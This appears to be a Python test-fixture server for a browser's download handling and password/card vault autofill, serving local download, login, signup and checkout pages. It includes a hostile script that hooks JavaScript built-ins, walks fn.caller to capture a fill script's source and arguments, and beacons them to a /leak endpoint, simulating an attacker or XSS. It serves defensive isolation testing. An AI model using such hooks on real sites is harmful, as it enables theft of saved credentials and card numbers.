"""Download site for the browser check (default.nix): pages that start downloads by a link, a form
POST answered with an attachment, a form POST answered with a 302 to a file on
another origin (APKSum's shape), and a script-built blob; plus a fetch() re-POST
of the redirecting form and a file over browser_downloads' 50 MiB limit. /login is
a login form for the vault test, /signup a signup form (password and confirmation).
Card checkouts for the vault's hosted card-field fill: /card is a processor's card
frame (number, expiry, CVC); /checkout embeds it from http://localhost:<card port>
(the stand-in processor origin), /checkout-evil embeds the same frame from
http://localhost:<this port> (an origin the shop controls, not a processor),
/checkout-nested embeds the processor frame inside /wrap from that origin.
The card port is the second argument (default 8767).
Hostile pages for the vault's isolation (any page code, attacker or XSS): /card-hostile
is the card frame with every built-in a fill script could call hooked (Array.from,
JSON.stringify, Object.keys, Function.prototype.call/toString, Array.prototype.*, DOM
methods) and walking fn.caller from each hook; /checkout-hostile embeds it from the
processor origin, /login-hostile is the login form with the same hooks. Each hook hit
is sent to /leak on the serving origin; GET /leaks returns them (JSON) and clears them.

Files are deterministic bytes; `site.py --sha <name>` prints a file's sha256.
"""
import hashlib
import json
import socket
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def payload(name: str, size: int) -> bytes:
    seed = hashlib.sha256(name.encode()).digest()
    out = bytearray()
    block = seed
    while len(out) < size:
        block = hashlib.sha256(block).digest()
        out += block
    return bytes(out[:size])


FILES = {
    "link.bin": 300_000,
    "form.bin": 1_234_567,
    "js.bin": 77_777,
    "redirect.bin": 1_678_318,
}
BIG = 60 * 1024 * 1024  # over the 50 MiB save limit

INDEX = b"""<!doctype html><html><head><title>downloads</title></head><body>
<h1>Downloads</h1>
<a id="link" href="/files/link.bin">Direct link download</a>
<form id="f" method="post" action="/submit">
  <input type="hidden" name="token" value="abc123">
  <button id="formbtn" type="submit">Form download</button>
</form>
<form id="f2" method="post" action="/submit-redirect">
  <input type="hidden" name="token" value="abc123">
  <button id="redirbtn" type="submit">Redirect form download</button>
</form>
<button id="jsbtn" onclick="go()">JS download</button>
<button id="fetchbtn" onclick="refetch()">Fetch re-POST</button>
<p id="fetchresult">none</p>
<a id="big" href="/files/big.bin">Big download</a>
<script>
async function go() {
  const r = await fetch('/raw/js.bin');
  const b = await r.blob();
  const a = document.createElement('a');
  a.href = URL.createObjectURL(b);
  a.download = 'js.bin';
  document.body.appendChild(a);
  a.click();
}
async function refetch() {
  const el = document.getElementById('fetchresult');
  try {
    const r = await fetch('/submit-redirect', {method: 'POST', body: new URLSearchParams(new FormData(document.getElementById('f2'))), credentials: 'include'});
    el.textContent = 'status ' + r.status;
  } catch (e) {
    el.textContent = 'err ' + e;
  }
}
</script>
</body></html>"""

LOGIN = b"""<!doctype html><html><head><title>login</title></head><body>
<form method="post" action="/login">
  <label>Username <input id="user" name="username" autocomplete="username"></label>
  <label>Password <input id="pw" name="password" type="password" autocomplete="current-password"></label>
  <button type="submit">Sign in</button>
</form>
</body></html>"""

SIGNUP = b"""<!doctype html><html><head><title>sign up</title></head><body>
<form method="post" action="/signup">
  <label>Email <input id="email" name="email" type="email" autocomplete="email"></label>
  <label>Password <input id="pw" name="password" type="password"></label>
  <label>Confirm password <input id="pw2" name="confirm" type="password"></label>
  <button type="submit">Create account</button>
</form>
</body></html>"""

CARD = b"""<!doctype html><html><head><title>card</title></head><body>
<input id="number" name="cardnumber" autocomplete="cc-number" inputmode="numeric">
<input id="expiry" name="exp-date" autocomplete="cc-exp">
<input id="cvc" name="cvc" autocomplete="cc-csc">
</body></html>"""


# Page code that hunts for a vault script: hooks walk .caller and report its source (and their arguments).
HOOKS = br"""<script>
(() => {
  const realToString = Function.prototype.toString, realStringify = JSON.stringify, realApply = Reflect.apply;
  let busy = false;
  const send = (what) => { const i = new Image(); i.src = '/leak?d=' + encodeURIComponent(String(what).slice(0, 4000)); };
  function record(name, hook, args) {
    if (busy) return; busy = true;
    try {
      let fn = null; try { fn = hook.caller; } catch (e) {}
      for (let d = 0; fn && d < 12; d++) { try { send(name + ' caller: ' + realToString.call(fn)); } catch (e) {} try { fn = fn.caller; } catch (e) { break; } }
      try { send(name + ' args: ' + realStringify(Array.prototype.slice.call(args))); } catch (e) {}
    } finally { busy = false; }
  }
  const hookIt = (owner, key, label) => {
    const real = owner[key]; if (typeof real !== 'function') return;
    const hook = function hook() { record(label, hook, arguments); return realApply(real, this, arguments); };
    try { Object.defineProperty(owner, key, { value: hook, writable: true, configurable: true }); } catch (e) {}
  };
  for (const k of ['from', 'isArray']) hookIt(Array, k, 'Array.' + k);
  for (const k of ['stringify', 'parse']) hookIt(JSON, k, 'JSON.' + k);
  for (const k of ['keys', 'getOwnPropertyDescriptor', 'assign']) hookIt(Object, k, 'Object.' + k);
  for (const k of ['join', 'map', 'flatMap', 'forEach', 'filter', 'find', 'some', 'push', 'indexOf', 'includes']) hookIt(Array.prototype, k, 'Array.prototype.' + k);
  for (const k of ['startsWith', 'trim', 'toLowerCase', 'replace']) hookIt(String.prototype, k, 'String.prototype.' + k);
  for (const k of ['call', 'apply', 'toString']) hookIt(Function.prototype, k, 'Function.prototype.' + k);
  for (const k of ['querySelectorAll', 'getAttribute', 'setAttribute', 'removeAttribute', 'dispatchEvent', 'focus']) {
    for (const owner of [Document.prototype, Element.prototype, EventTarget.prototype, HTMLElement.prototype]) hookIt(owner, k, k);
  }
  window.hermesPageMarker = 'page-world';
  // Control: the page's own sloppy call is caught, so the beacon path works.
  (function control() { const marker = 'hook-control-marker'; Array.from([marker]); })();
})();
</script>"""

CARD_HOSTILE = CARD.replace(b"<head>", b"<head>" + HOOKS)
LOGIN_HOSTILE = LOGIN.replace(b"<head>", b"<head>" + HOOKS)
LEAKS: list[str] = []


def checkout(frame_url: str) -> bytes:
    return ('<!doctype html><html><head><title>checkout</title></head><body>\n'
            '<label>Email <input id="email" type="email" autocomplete="email"></label>\n'
            f'<iframe id="card" src="{frame_url}" width="400" height="200"></iframe>\n'
            # any page script may move the card frame (the navigation race)
            "<script>window.hijack = (to) => { document.getElementById('card').src = to; };</script>\n"
            '</body></html>').encode()


def wrap(frame_url: str) -> bytes:
    return b'<!doctype html><html><body><iframe src="' + frame_url.encode() + b'" width="380" height="180"></iframe></body></html>'


class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("site: " + fmt % args + "\n")

    def _file(self, name, data, attach=True):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        if attach:
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(INDEX)))
            self.end_headers()
            self.wfile.write(INDEX)
        elif self.path in ("/login", "/signup"):
            page = LOGIN if self.path == "/login" else SIGNUP
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path.startswith("/leak?"):
            from urllib.parse import parse_qs, urlsplit
            LEAKS.append(parse_qs(urlsplit(self.path).query).get("d", [""])[0])
            self.send_response(204)
            self.end_headers()
        elif self.path == "/leaks":
            body = json.dumps(LEAKS).encode()
            LEAKS.clear()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path in ("/card", "/checkout", "/checkout-evil", "/checkout-nested", "/wrap", "/card-hostile",
                           "/checkout-hostile", "/login-hostile"):
            port = self.server.server_address[1]
            processor = f"http://localhost:{CARD_PORT}/card"
            page = {"/card": CARD, "/checkout": checkout(processor),
                    "/checkout-evil": checkout(f"http://localhost:{port}/card"),
                    "/checkout-nested": checkout(f"http://localhost:{port}/wrap"),
                    "/wrap": wrap(processor), "/card-hostile": CARD_HOSTILE,
                    "/checkout-hostile": checkout(processor + "-hostile"),
                    "/login-hostile": LOGIN_HOSTILE}[self.path]
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)
        elif self.path == "/files/big.bin":
            self._file("big.bin", payload("big.bin", BIG))
        elif self.path.startswith("/files/") and self.path[7:] in FILES:
            n = self.path[7:]
            self._file(n, payload(n, FILES[n]))
        elif self.path.startswith("/raw/") and self.path[5:] in FILES:
            n = self.path[5:]
            self._file(n, payload(n, FILES[n]), attach=False)
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length)
        if self.path == "/submit-redirect" and b"token=abc123" in body:
            # Like APKSum: the POST answers 302 to a file on another origin.
            port = self.server.server_address[1]
            self.send_response(302)
            self.send_header("Location", f"http://localhost:{port}/files/redirect.bin")
            self.send_header("Content-Length", "0")
            self.end_headers()
        elif self.path == "/submit" and b"token=abc123" in body:
            self._file("form.bin", payload("form.bin", FILES["form.bin"]))
        else:
            self.send_error(403)


class DualStack(ThreadingHTTPServer):
    # localhost may resolve to ::1 first, so listen on both families.
    address_family = socket.AF_INET6

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        super().server_bind()


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--sha":
        n = sys.argv[2]
        print(hashlib.sha256(payload(n, BIG if n == "big.bin" else FILES[n])).hexdigest())
        sys.exit(0)
    CARD_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8767
    DualStack(("::", int(sys.argv[1]) if len(sys.argv) > 1 else 8765), H).serve_forever()
